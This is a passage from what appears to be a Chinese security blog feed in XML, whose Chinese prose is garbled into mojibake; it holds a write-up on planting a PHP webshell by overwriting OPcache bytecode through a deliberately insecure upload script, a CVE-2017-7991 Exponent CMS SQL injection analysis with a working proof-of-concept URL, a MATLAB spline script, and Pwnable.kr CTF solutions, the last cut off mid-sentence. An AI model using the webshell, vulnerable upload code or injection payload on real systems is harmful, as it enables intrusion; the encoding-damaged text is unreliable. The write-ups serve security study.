      <url>%2F2017%2F05%2F13%2F%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell%2F</url>
      <content type="text"><![CDATA[OPcacheæ‰©å±•åœ¨PHP5.5.0ç‰ˆæœ¬åŽä¸­å·²ç»ç»‘å®šäº†ï¼Œå®ƒå¯ä»¥æŠŠPHPè„šæœ¬é¢„ç¼–è¯‘çš„å­—èŠ‚ç å­˜æ”¾åˆ°ç¼“å­˜ä¸­ï¼Œä»Žè€Œæé«˜æ€§èƒ½ï¼ŒåŠ é€Ÿè®¿é—®ã€‚åŒæ—¶ä¹Ÿå¯ä»¥åˆ©ç”¨å®ƒæ¥è¿›è¡Œgetshellã€‚æœ¬æ–‡æ˜¯å¯¹ ã€Šbinary-webshell-through-opcache-in-php-7ã€‹ä¸€æ–‡çš„æµ‹è¯•ã€‚ å…³äºŽOPcacheåœ¨æˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªç¼“å­˜ç›®å½•ï¼ˆåŽé¢æåˆ°ï¼‰åŽï¼Œphpä¼šæŠŠç¼–è¯‘å¥½çš„phpå­—èŠ‚ç æ–‡ä»¶æ”¾åˆ°è¿™ä¸ªç¼“å­˜ç›®å½•ä¸­ã€‚è¿™é‡Œå‡è®¾è¯¥ç¼“å­˜ç›®å½•æ˜¯/var/www/html/opcacheï¼Œæœªè®¿é—®å‰ï¼Œopcacheæ–‡ä»¶å¤¹ä¸ºç©ºã€‚æŽ¥ä¸‹åŽ»æˆ‘åŽ»è®¿é—® index.phpåŽï¼Œphpä¼šåœ¨ opcacheæ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºmd5å“ˆå¸Œå€¼çš„æ–‡ä»¶å¤¹ï¼Œå…¶ä¸‹çš„ç›®å½•ç»“æž„å’Œ index.phpæ‰€åœ¨ç›®å½•ç»“æž„ç›¸åŒï¼ŒåŒæ—¶ç”Ÿæˆäº† index.php.binã€‚ è¿™ä¸ªindex.php.bin å°±æ˜¯ index.php çš„ç¼“å­˜æ–‡ä»¶ã€‚å¹¶ä¸”ä½œä¸ºwww-dataç”¨æˆ·ï¼Œæˆ‘ä»¬å¯¹ 5672f68788bcb25b11403b33f5d1497f å…·æœ‰è¯»å†™æ‰§è¡Œæƒé™ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬æƒ³åŠžæ³•æŠŠè¿™ä¸ªindex.php.binæ›¿æ¢ä¸ºåŒ…å«æœ‰æ¶æ„ä»£ç çš„index.php.binæ–‡ä»¶ï¼Œå½“æˆ‘ä»¬å†æ¬¡åŽ»è®¿é—®index.phpæ—¶ï¼Œphpä¼šé€‰æ‹©åŠ è½½è¿™ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œä»Žè€Œæˆ‘ä»¬è¾¾åˆ°äº†getshellçš„ç›®çš„ã€‚è¿™ä¸ªæ€è·¯ï¼Œæ„Ÿè§‰è·ŸäºŒè¿›åˆ¶æ¼æ´žä¸­çš„GOTè¦†å†™æŠ€æœ¯æœ‰ç‚¹ç¥žä¼¼å§ã€‚ çŽ¯å¢ƒé…ç½®phpç‰ˆæœ¬12345root@4db5ba2ab3bf:/var/www/html# php -vPHP 7.0.15-0ubuntu0.16.04.4 (cli) ( NTS )Copyright (c) 1997-2017 The PHP GroupZend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies with Zend OPcache v7.0.15-0ubuntu0.16.04.4, Copyright (c) 1999-2017, by Zend Technologies é…ç½®OPcacheå¼€å¯OPcacheåœ¨phpé…ç½®æ–‡ä»¶ php.ini çš„çº¦èŽ« 1745 è¡Œå·¦å³ï¼Œæ‰¾åˆ°å¦‚ä¸‹é…ç½®ï¼š1;opcache.enable=0 åŽ»æŽ‰å‰é¢çš„åˆ†å·;ï¼Œå°†0æ”¹ä¸º1ï¼Œå¦‚ä¸‹ï¼š1opcache.enable=1 å…³é—­æ—¶é—´æˆ³éªŒè¯1;opcache.validate_timestamps=1 ä¿®æ”¹ä¸º1opcache.validate_timestamps=0 è®¾ç½®OPcacheç¼“å­˜è·¯å¾„ç»§ç»­å‘ä¸‹ç¿»ï¼Œæ‰¾åˆ°å¦‚ä¸‹é…ç½®ï¼š1;opcache.file_cache= è¿™é‡Œæˆ‘ä¿®æ”¹åŽçš„é…ç½®æ˜¯ï¼š1opcache.file_cache= &quot;/var/www/html/opcache&quot; è®¾ç½®ç¼“å­˜æ–‡ä»¶ä¼˜å…ˆçº§1;opcache.file_cache_only=0 ä¿®æ”¹ä¸º1opcache.file_cache_only=1 é‡å¯apacheè¿™é‡Œæˆ‘ä»¥apacheä½œä¸ºwebæœåŠ¡å™¨ã€‚1service apache2 resart é‡å¯ï¼Œä½¿å‰é¢ä¿®æ”¹çš„php.iniç”Ÿæ•ˆ wwwç›®å½•index.php12345678910111213&lt;html&gt; &lt;body&gt; &lt;form action="upload-file.php" method="post" enctype="multipart/form-data"&gt; &lt;label for="file"&gt;filename:&lt;/label&gt; &lt;input type="file" name="file" id="file" /&gt; &lt;br/&gt; &lt;label for="filepath"&gt;filepath:&lt;/label&gt; &lt;input type="text" name="filepath" id="filepath" /&gt; &lt;br/&gt; &lt;input type="submit" name="submit" value="submit" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; upload-file.php12345678&lt;?php $path = $_POST['filepath']; echo "filename: " . $_FILES["file"]["name"] . "&lt;br /&gt;"; echo "type: " . $_FILES["file"]["type"] . "&lt;br /&gt;"; echo "size: " . ($_FILES["file"]["size"] / 1024) . " Kb&lt;br /&gt;"; move_uploaded_file($_FILES["file"]["tmp_name"], $path . $_FILES["file"]["name"]); echo "save : " . $path . $_FILES["file"]["name"]; ?&gt; é‚£ä¸ªã€‚ã€‚ä»£ç å†™å¾—å¾ˆä¸‘ã€‚ã€‚ä»…ä¸ºæµ‹è¯•ä¹‹ç”¨ï¼šï¼‰ phpinfo.php123&lt;?php phpinfo();?&gt; getshellçŽ°åœ¨å¼€å§‹é»‘ç›’æµ‹è¯•ã€‚ã€‚ åˆ©ç”¨phpinfoèŽ·å–ä¿¡æ¯ å¯çŸ¥ï¼ŒOPcacheç¼“å­˜è·¯å¾„åœ¨ /var/www/html/opcache ä¸­ã€‚ä¸”æœåŠ¡å™¨ç«¯å¼€å¯äº† opcache.file_cache_only,ç¦ç”¨äº†opcache.validate_timestampsã€‚ è¿™æ˜¯èƒ½æˆåŠŸåˆ©ç”¨çš„æ¡ä»¶ã€‚ php7-opcache-override.pyç”±å‰å¯çŸ¥ï¼Œåœ¨å¯¹ç¼“å­˜æ–‡ä»¶è¿›è¡Œæ“ä½œå‰ï¼Œéœ€è¦ç»è¿‡ä¸€ä¸ªåç§°æ˜¯md5å“ˆå¸Œå€¼çš„æ–‡ä»¶å¤¹ã€‚è¿™å¯ä»¥é€šè¿‡ hp7-opcache-override.py æ¥è®¡ç®—ã€‚ å¾—åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹åä¸ºï¼š5672f68788bcb25b11403b33f5d1497f æž„å»ºæ¶æ„çš„ç¼“å­˜æ–‡ä»¶æ¶æ„çš„ç¼“å­˜æ–‡ä»¶å¾—å…ˆæœ¬åœ°ç”Ÿæˆï¼Œç„¶åŽé€šè¿‡å„ç§æ–¹å¼æ¯”å¦‚ä¸Šä¼ ç­‰åŽ»è¦†ç›–æœåŠ¡å™¨ä¸Šçš„ç¼“å­˜æ–‡ä»¶ã€‚æˆ‘ä»¬å…ˆåœ¨æœ¬åœ°é…ç½®å¥½OPcacheï¼Œè¿™æ ·æ‰èƒ½ç”Ÿæˆç¼“å­˜æ–‡ä»¶ã€‚ç„¶åŽæœ¬åœ°æ–°å»ºä¸€ä¸ª index.php,å†…å®¹æ˜¯ä¸€å¥è¯æœ¨é©¬&lt;?php @eval($_POST[test]);?&gt;ï¼Œä¹‹åŽè®¿é—®å®ƒã€‚åœ¨å¯¹åº”çš„ç¼“å­˜æ–‡ä»¶å¤¹é‡Œå¯ä»¥çœ‹åˆ°index.php.binç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå°†OPCACHE.åŽçš„é‚£ä¸²md5å“ˆå¸Œå€¼ï¼Œæ›¿æ¢ä¸ºå‰ä¸€æ­¥éª¤å¾—åˆ°çš„å“ˆå¸Œå€¼ï¼š5672f68788bcb25b11403b33f5d1497f ,ä¿®æ”¹åŽå¦‚ä¸‹ï¼š è¦†ç›–åŽŸç¼“å­˜æ–‡ä»¶åœ¨è¦†ç›–ä¹‹å‰ï¼Œå…ˆçœ‹çœ‹æœåŠ¡å™¨ä¸Šçš„åŽŸç¼“å­˜æ–‡ä»¶é•¿å•¥æ ·ï¼š è¿™é‡Œåˆ©ç”¨ä¸Šä¼ æ¥è¿›è¡Œè¦†ç›–ã€‚è®¿é—®index.php,é€‰æ‹©ä¿®æ”¹åŽçš„index.php.binè¿›è¡Œä¸Šä¼ ï¼Œä¸Šä¼ è·¯å¾„ä¸ºè¦è¦†ç›–çš„ç¼“å­˜æ–‡ä»¶çš„ç›¸å¯¹åœ°å€ opcache/5672f68788bcb25b11403b33f5d1497f/var/www/html/ã€‚ ä¸Šä¼ å®ŒæˆåŽï¼ŒæœåŠ¡å™¨ä¸Šçš„ç¼“å­˜æ–‡ä»¶å·²ç»æ›¿æ¢æˆæˆ‘ä»¬æž„é€ çš„æ¶æ„æ–‡ä»¶äº†ã€‚ èœåˆ€è¿žä¸Šæ­¤æ—¶å†åŽ»è®¿é—® index.php,å‘çŽ°å·²ç»è¢«ä¿®æ”¹äº†ï¼Œä¸å†æ˜¯ä¸Šä¼ çš„é¡µé¢ã€‚ç”¨èœåˆ€è¿žä¸Šï¼Œå¯†ç æ˜¯ test ã€‚æˆåŠŸgetshellã€‚ CTFå‰é¢æˆ‘ä»¬æ˜¯é€šè¿‡ä¸Šä¼ æ¥å®žçŽ°è¦†ç›–ï¼Œä½†å®žé™…åˆ©ç”¨èµ·æ¥è‚¯å®šæ²¡é‚£ä¹ˆç®€å•ã€‚åˆ©ç”¨OPcacheæ¥èŽ·å¾—webshellçš„å§¿åŠ¿ä¸€èˆ¬éƒ½ä¼šå’Œå…¶ä»–å§¿åŠ¿ç›¸ç»“åˆã€‚æ¯”å¦‚ä¸‹é¢ä¸¤é¢˜CTFé¢˜ ASIS CTF 2016 â€“ BinaryCloudè¿™é¢˜æ˜¯é€šè¿‡ä¸Šä¼ æ¥è¦†ç›–ï¼Œä½†åŽç«¯æœ‰å„ç§è¿‡æ»¤ã€‚é™„ä¸Šwriteup ALICTF 2016 - homeworkè¿™é¢˜åˆ©ç”¨sqlæ³¨å…¥çš„dumpfileæ¥å®žçŽ°å¯¹ç¼“å­˜æ–‡ä»¶çš„è¦†ç›–ã€‚é™„ä¸Šwriteup ï¼ˆAuthor:chybetaï¼‰]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injectionåˆ†æž]]></title>
      <url>%2F2017%2F05%2F12%2FCVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[Exponent CMSæ˜¯ä¸€æ¬¾å¼€æºçš„CMSï¼Œå…¶2.4.1ç‰ˆä¸­å­˜åœ¨sqlæ³¨å…¥ æ¼æ´žæ³¨å…¥ç‚¹åœ¨ /framework/modules/eaas/controllers/eaasController.php ä¸­ã€‚å¦‚ä¸‹ï¼š 12345678910111213141516171819202122public function api() &#123; if (empty($this-&gt;params['apikey'])) &#123; $_REQUEST['apikey'] = true; // set this to force an ajax reply $ar = new expAjaxReply(550, 'Permission Denied', 'You need an API key in order to access Exponent as a Service', null); $ar-&gt;send(); //FIXME this doesn't seem to work correctly in this scenario &#125; else &#123; $key = expUnserialize(base64_decode(urldecode($this-&gt;params['apikey']))); $cfg = new expConfig($key); $this-&gt;config = $cfg-&gt;config; if(empty($cfg-&gt;id)) &#123; $ar = new expAjaxReply(550, 'Permission Denied', 'Incorrect API key or Exponent as a Service module configuration missing', null); $ar-&gt;send(); &#125; else &#123; if (!empty($this-&gt;params['get'])) &#123; $this-&gt;handleRequest(); &#125; else &#123; $ar = new expAjaxReply(200, 'ok', 'Your API key is working, no data requested', null); $ar-&gt;send(); &#125; &#125; &#125;&#125; api()ä¸­ï¼Œå…ˆæ£€æµ‹å‚æ•°apikey æ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ä¸ºç©ºï¼Œåˆ™è¿›å…¥elseåˆ†æ”¯ã€‚åœ¨åˆ†æ”¯ä¸­ï¼Œå…ˆå¯¹å‚æ•°apikeyè¿›è¡Œä¸€æ¬¡urldecode,æŽ¥ç€è¿›è¡Œ base64_decode,æœ€åŽè¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–expUnserializeï¼Œåœ¨expUnserializeä¸­å­˜åœ¨ä¸€æ¬¡å°å°çš„è¿‡æ»¤ï¼š1234567891011121314function expUnserialize($serial_str) &#123; if ($serial_str === 'Array') return null; // empty array string?? if (is_array($serial_str) || is_object($serial_str)) return $serial_str; // already unserialized// $out1 = @preg_replace('!s:(\d+):"(.*?)";!se', "'s:'.strlen('$2').':\"$2\";'", $serial_str ); $out = preg_replace_callback( '!s:(\d+):"(.*?)";!s', create_function ('$m', '$m_new = str_replace(\'"\',\'\"\',$m[2]); return "s:".strlen($m_new).\':"\'.$m_new.\'";\';' ), $serial_str );// if ($out1 !== $out) &#123;// eDebug('problem:&lt;br&gt;'.$out.'&lt;br&gt;'.$out1);// &#125; å®ƒä¼šæŠŠ ç»è¿‡base64_decodeåŽçš„$apikey ä¸­çš„åŒå¼•å·åŠ ä¸Šæ–œæ ã€‚ä½†æ˜¯å¯¹äºŽå•å¼•å·ï¼Œå®ƒæ²¡æœ‰è¿›è¡Œå¤„ç†ã€‚åœ¨è¿›è¡ŒexpUnserializeä¹‹åŽï¼Œèµ‹å€¼ç»™$keyï¼Œå¹¶åœ¨ä¹‹åŽå®žä¾‹åŒ–ä¸€ä¸ª expConfigå¯¹è±¡ã€‚expConfigéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š 12345678910111213class expConfig extends expRecord &#123; protected $table = 'expConfigs'; function __construct($params=null) &#123; global $db; if (!is_array($params)) &#123; $this-&gt;location_data = serialize($params); parent::__construct($db-&gt;selectValue($this-&gt;table, 'id', "location_data='".$this-&gt;location_data."'")); &#125; else &#123; parent::__construct($params); &#125; .... åœ¨ framysqli\core\subsystems\database\mysqli.php ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…³äºŽselectValueçš„å®šä¹‰ï¼š 123456789101112131415function selectValue($table, $col, $where=null) &#123; if ($where == null) $where = "1"; $sql = "SELECT " . $col . " FROM `" . $this-&gt;prefix . "$table` WHERE $where LIMIT 0,1"; $res = @mysqli_query($this-&gt;connection, $sql); if ($res == null) return null; $obj = mysqli_fetch_object($res); if (is_object($obj)) &#123; return $obj-&gt;$col; &#125; else &#123; return null; &#125;&#125; å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ£€æŸ¥å®Œ$paramsæ˜¯å¦æ˜¯æ•°ç»„åŽï¼Œå°†æˆ‘ä»¬ä¼ å…¥çš„$paramsåºåˆ—åŒ–åŽç›´æŽ¥æ’å…¥åˆ°äº†æ•°æ®åº“æŸ¥è¯¢è¯­å¥ä¸­,æœªä½œä»»ä½•è¿‡æ»¤å’Œæ£€æµ‹ã€‚åŠ ä¸Šä¹‹å‰å¹¶æœªå¯¹å•å¼•å·è¿›è¡Œå¤„ç†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å•å¼•å·ï¼Œå¯¹ location_data=&#39;&quot;.$this-&gt;location_data.&quot;&#39; ä¸­çš„å•å¼•å·è¿›è¡Œé—­åˆã€‚ POC1234http://localhost:2500/exponent241/index.php?module=eaas&amp;action=api&amp;apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7 å…¶ä¸­ base64_decode(â€œczoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7â€) = s:16:â€aaaâ€™or â€œâ€˜sleep(2)# æŸ¥çœ‹ mysql.log ï¼Œå¯ä»¥å‘çŽ°æˆåŠŸæ³¨å…¥ã€‚è¿è¡Œçš„ sqlè¯­å¥ ä¸ºï¼š 1SELECT id FROM `exponent_expConfigs` WHERE location_data=&apos;s:19:&quot;aaa&apos;or \&quot;&apos;sleep(2)#&quot;;&apos; LIMIT 0,1 å¯ä»¥çœ‹åˆ°å•å¼•å·è¢«æˆåŠŸé—­åˆã€‚]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ä¸‰æ¬¡æ ·æ¡æ’å€¼ä¹‹MATLABå®žçŽ°]]></title>
      <url>%2F2017%2F04%2F09%2F%E4%B8%89%E6%AC%A1%E6%A0%B7%E6%9D%A1%E6%8F%92%E5%80%BC%E4%B9%8BMATLAB%E5%AE%9E%E7%8E%B0%2F</url>
      <content type="text"><![CDATA[ä¸‰æ¬¡æ ·æ¡æ’å€¼ä¹‹MATLABå®žçŽ° Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475clear allx = input('è¾“å…¥æ¨ªåæ ‡ï¼Œæ ¼å¼:[x1 x2 â€¦â€¦ xn]\n')y = input('è¾“å…¥çºµåæ ‡ï¼Œæ ¼å¼:[y1 y2 â€¦â€¦ yn]\n')n = length(x);flag = input('è¯·é€‰æ‹©è¾¹ç•Œæ¡ä»¶ï¼šâ‘ å·²çŸ¥ä¸¤ç«¯ä¸€é˜¶å¯¼æ•°å€¼ï¼Œâ‘¡å·²çŸ¥ä¸¤ç«¯äºŒé˜¶å¯¼æ•°å€¼ã€‚é€‰æ‹© 1 or 2 :');if flag == 1 y1_deri = input('x1 çš„ ä¸€é˜¶å¯¼æ•°å€¼ï¼š'); yn_deri = input('xn çš„ ä¸€é˜¶å¯¼æ•°å€¼ï¼š');else y1_deri = input('x1 çš„ äºŒé˜¶å¯¼æ•°å€¼ï¼š'); yn_deri = input('xn çš„ äºŒé˜¶å¯¼æ•°å€¼ï¼š');endfor i = 1 : n-1 h(i) = x(i+1) - x(i);endfprintf('è®¡ç®— h ç»“æžœä¸º:\n');hfor i = 2 : n-1 u(i-1) = h(i-1) / (h(i-1) + h(i)); lamda(i) = h(i) / (h(i-1) + h(i));endif flag == 1 u(n-1) = 1; lamda(1) = 1;else u(n-1) = 0; lamda(1) = 0;endfprintf('è®¡ç®— Î¼ ç»“æžœä¸º: \n');ufprintf('è®¡ç®— Î» ç»“æžœä¸ºï¼š\n');lamdafor i = 2 : n-1 d(i) = 6 * ((y(i+1)-y(i))/(x(i+1)-x(i)) - (y(i) - y(i-1))/( x(i) - x(i-1)))/(h(i-1)+h(i));endif flag == 1 d(1) = 6 / h(1) * (( y(2)-y(1) )/( x(2) - x(1) ) - y1_deri); d(n) = 6 / h(n-1) * (yn_deri - ((y(n) - y(n-1)) / ( x(n) - x(n-1))));else d(1) = 2 * y1_deri; d(n) = 2 * yn_deri;endfprintf('è®¡ç®— d çš„ç»“æžœï¼š\n');dmatrix1 = zeros(n,n);for i = 1 : n-1 matrix1(i,i) = 2; matrix1(i,i+1) = lamda(i); matrix1(i+1,i) = u(i);endmatrix1(n,n) = 2;matrix1;fprintf('æ±‚å¾— M ç»“æžœ:\n');M = matrix1\d'for i = 1 : n-1 clear S syms t k = x(i):0.001:x(i+1); fprintf('åŒºé—´ä¸º[ %.3f : %.3f]\n',x(i),x(i+1)); S = M(i)*(x(i+1)-t)^3/ (6*h(i)) + M(i+1)*(t - x(i))^3/(6*h(i))+(y(i) - M(i)*h(i)^2/6)*(x(i+1) - t)/h(i) + (y(i+1) - M(i+1)*h(i)^2/6)*(t - x(i))/h(i) s = M(i)*(x(i+1)-k).^3/ (6*h(i)) + M(i+1)*(k - x(i)).^3/(6*h(i))+(y(i) - M(i)*h(i)^2/6)*(x(i+1) - k)/h(i) + (y(i+1) - M(i+1)*h(i)^2/6)*(k - x(i))/h(i); hold on; plot(k,s);end Resultæµ‹è¯•ä¾‹é¢˜ï¼šã€Šè®¡ç®—æ–¹æ³•ã€‹ï¼ˆæŽåº†æ‰¬ç‰ˆï¼‰P44 ä¾‹71234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&gt;&gt; sanciyangtiaoè¾“å…¥æ¨ªåæ ‡ï¼Œæ ¼å¼:[x1 x2 â€¦â€¦ xn][27.7 28 29 30]x = 27.7000 28.0000 29.0000 30.0000è¾“å…¥çºµåæ ‡ï¼Œæ ¼å¼:[y1 y2 â€¦â€¦ yn][4.1 4.3 4.1 3.0]y = 4.1000 4.3000 4.1000 3.0000è¯·é€‰æ‹©è¾¹ç•Œæ¡ä»¶ï¼šâ‘ å·²çŸ¥ä¸¤ç«¯ä¸€é˜¶å¯¼æ•°å€¼ï¼Œâ‘¡å·²çŸ¥ä¸¤ç«¯äºŒé˜¶å¯¼æ•°å€¼ã€‚é€‰æ‹© 1 or 2 :1x1 çš„ ä¸€é˜¶å¯¼æ•°å€¼ï¼š3.0xn çš„ ä¸€é˜¶å¯¼æ•°å€¼ï¼š-4.0è®¡ç®— h ç»“æžœä¸º:h = 0.3000 1.0000 1.0000è®¡ç®— Î¼ ç»“æžœä¸º:u = 0.2308 0.5000 1.0000è®¡ç®— Î» ç»“æžœä¸ºï¼šlamda = 1.0000 0.7692 0.5000è®¡ç®— d çš„ç»“æžœï¼šd = -46.6667 -4.0000 -2.7000 -17.4000æ±‚å¾— M ç»“æžœ:M = -23.5314 0.3960 0.8297 -9.1149åŒºé—´ä¸º[ 27.700 : 28.000]S =(35650*(t - 28)^3)/2727 - (107*t)/202 + (200*(t - 277/10)^3)/909 + 19317/1010åŒºé—´ä¸º[ 28.000 : 29.000]S =(419*(t - 28)^3)/3030 - (55*t)/202 - (20*(t - 29)^3)/303 + 35929/3030åŒºé—´ä¸º[ 29.000 : 30.000]S =(563*t)/1010 - (4603*(t - 29)^3)/3030 - (419*(t - 30)^3)/3030 - 36977/3030]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:random]]></title>
      <url>%2F2017%2F04%2F09%2FPwnable-kr-random%2F</url>
      <content type="text"><![CDATA[ä¼ªéšæœº randomå…ˆfileçœ‹ä¸€ä¸‹ IDAæ‰“å¼€ å¯ä»¥çœ‹åˆ°ç¨‹åºè¯»å…¥ v4 ï¼Œè·Ÿ v5 è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œè‹¥ç»“æžœä¸º 0xDEADBEEF ï¼Œåˆ™å¯ä»¥è¯»å–åˆ°flagã€‚å…¶ä¸­ v5çš„åˆå§‹å€¼ç”± randï¼ˆï¼‰æŒ‡å®šã€‚ randï¼ˆï¼‰randï¼ˆï¼‰äº§ç”Ÿä¼ªéšæœºæ•°ã€‚ä¼ªéšæœºæ•°çš„â€œéšæœºâ€ä¹‹å¤„æ˜¯å®ƒçš„ç§å­ï¼ˆseedï¼‰ã€‚ç§å­ç¡®å®šåŽï¼ŒæŒ‰ç…§ä¸€å®šç®—æ³•æ‰€è®¡ç®—å‡ºæ¥çš„éšæœºæ•°åºåˆ—ä¹Ÿå°±å®Œå…¨ç¡®å®šäº†ã€‚ Cè¯­è¨€ä¸­ï¼Œå¯ä»¥é€šè¿‡ srand() æ¥æŒ‡å®šç§å­ï¼ˆseedï¼‰ã€‚å¦‚æžœç”¨æˆ·åœ¨è°ƒç”¨ randï¼ˆï¼‰ä¹‹å‰æ²¡æœ‰è°ƒç”¨è¿‡ srandï¼ˆï¼‰ï¼Œåˆ™ç³»ç»Ÿé»˜è®¤ç§å­ä¸º 1 ã€‚æµ‹è¯•å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char const *argv[])&#123; unsigned int random1; random1 = rand(); printf("No srand():\n"); printf("random1 = %u\n", random1); unsigned int random2; srand(1); random2 = rand(); printf("srand(1):\n"); printf("random2 = %u\n", random2); unsigned int random3; srand(2); random3 = rand(); printf("srand(2):\n"); printf("random3 = %u\n", random3); return 0;&#125; Expç”±ä»¥ä¸Šåˆ†æžå¯çŸ¥ï¼Œv5çš„å€¼å…¶å®žæ˜¯ç¡®å®šçš„ï¼Œä¸º 1804289383ã€‚è€Œåˆ¤æ–­æ¡ä»¶(v5 ^ v4) == 0xDEADBEEF ç­‰ä»·äºŽ v4 == 0xDEADBEEF ^ v5 ã€‚è¿ç®—å¯å¾— 1804289383 ^ 0xDEADBEEF = 3039230856ã€‚æ‰€ä»¥æˆ‘ä»¬è¦ç»™ v4 ä¼ å…¥ 3039230856 ã€‚ 1234random@ubuntu:~$ ./random3039230856 Good!Mommy, I thought libc random is unpredictable... FLAG: Mommy, I thought libc random is unpredictableâ€¦]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:passcode]]></title>
      <url>%2F2017%2F04%2F08%2FPwnable-kr-passcode%2F</url>
      <content type="text"><![CDATA[ç®€å•GOTè¦†å†™ passcodemainå…ˆfileçœ‹ä¸€ä¸‹ï¼Œ32ä½ã€‚ ç”¨IDAæ‰“å¼€ï¼Œf5 å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è°ƒç”¨å®Œ welcome() åŽç«‹å³è°ƒç”¨äº† login()ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œwelcome()æ ˆå¸§çš„æ ˆåº• å’Œ login()æ ˆå¸§çš„æ ˆåº• æ˜¯ä¸€æ ·çš„ã€‚ welcomeï¼ˆï¼‰ é€šè¿‡ __isoc99_scanf() è¯»å–nameå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²å¤§å°ä¸º100ã€‚ä¸”ç”±1int v1; // [sp+18h] [bp-10h]@0 è¿™ä¸€è¡Œå¯çŸ¥ï¼Œåœ¨ welcome() çš„æ ˆå¸§ä¸­ï¼Œnameå­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®åœ¨ ebp-70h çš„åœ°æ–¹ã€‚ loginï¼ˆï¼‰ è¿™é‡Œåˆ†åˆ«é€šè¿‡1__isoc99_scanf(&quot;%d&quot;) æ¥èŽ·å¾— passcode1 å’Œ passcode2 çš„å€¼ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œ scanf(â€œ%dâ€) ä¸­æ²¡æœ‰å‡ºçŽ°å–åœ°å€ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œscanf(â€œ%dâ€) ä¼šç›´æŽ¥æŠŠæ ˆä¸Šçš„æ•°æ®å½“ä½œæŒ‡é’ˆï¼Œå¹¶å°†è¯»å…¥çš„æ•°æ®å­˜æ”¾åˆ°è¿™ä¸ªâ€œæŒ‡é’ˆâ€æŒ‡çš„â€œåœ°å€â€ä¸Šã€‚ ä»¥ç¬¬ä¸€ä¸ªçº¢æ¡†ä¸ºä¾‹ï¼Œå®ƒå¯¹åº”ç€ passcode1 çš„è¯»å…¥ã€‚scanfçš„å‚æ•°æœ‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªæ˜¯åœ°å€è¡¨åˆ—ã€‚æŒ‰ç…§å‚æ•°ä»Žå³åˆ°å·¦å…¥æ ˆã€‚æ‰€ä»¥ä¸‹é¢è¿™æ®µè¯ï¼Œå°† ebp-0x10 å¤„çš„æ•°æ® æ”¾åˆ°äº† esp+0x4 å¤„ ä½œä¸ºäº† scanfçš„åœ°å€è¡¨é¡¹å‚æ•°12804857c: 8b 55 f0 mov edx,DWORD PTR [ebp-0x10]804857f: 89 54 24 04 mov DWORD PTR [esp+0x4],edx scanfçš„ç¬¬ä¸€ä¸ªå‚æ•°å³ æ ¼å¼åŒ–å­—ç¬¦ä¸² ç”±ä¸‹é¢è¿™ä¸¤å¥è¯ä¼ å…¥1238048577: b8 83 87 04 08 mov eax,0x8048783çœç•¥8048583: 89 04 24 mov DWORD PTR [esp],eax 0x8048783 å¤„çš„æ•°æ®å¦‚ä¸‹ï¼šæ‰€ä»¥å¯¹äºŽç¬¬ä¸€ä¸ª scanf(), å®ƒçš„ç¬¬äºŒä¸ªå‚æ•°çš„æ•°å€¼ä¸ºåœ¨loginï¼ˆï¼‰æ ˆå¸§çš„ ebp-0x10 å¤„çš„æ•°æ®ã€‚ å¯¹äºŽpasscode2 çš„åˆ†æžåŒç†ã€‚ CheckAnalysisä»Žloginï¼ˆï¼‰çš„é€»è¾‘æ¥çœ‹ï¼Œåªè¦ v1 = 0x528E6 å’Œ 0xCC07C9 ç¨‹åºå°±èƒ½æ‰§è¡Œåˆ° return systemï¼ˆï¼‰ã€‚è€Œä¸” welcomeï¼ˆï¼‰å’Œ loginï¼ˆï¼‰ çš„ ebp æ˜¯ç›¸åŒçš„ï¼Œæœ‰æ²¡æœ‰å¯èƒ½é€šè¿‡æž„é€  welcomeçš„è¾“å…¥ æ¥æŽ§åˆ¶ v1 v2 çš„å€¼å‘¢ï¼Ÿ ä»Žå‰è¾¹çš„idaåˆ†æžæ¥çœ‹ï¼Œåœ¨loginï¼ˆï¼‰çš„æ ˆå¸§ä¸­ï¼Œpasscode1ä½ç½®åœ¨ ebp-10h, åœ¨welcomeï¼ˆï¼‰æ ˆå¸§ä¸­ï¼Œnameå­—ç¬¦ä¸²èµ·å§‹ä½ç½®åœ¨ ebp-70hã€‚ç”±äºŽwelcomeï¼ˆï¼‰å’Œloginï¼ˆï¼‰è°ƒç”¨è¿žç»­ï¼Œä»–ä»¬çš„æ ˆå¸§çš„ebpå…¶å®žæ˜¯ä¸€æ 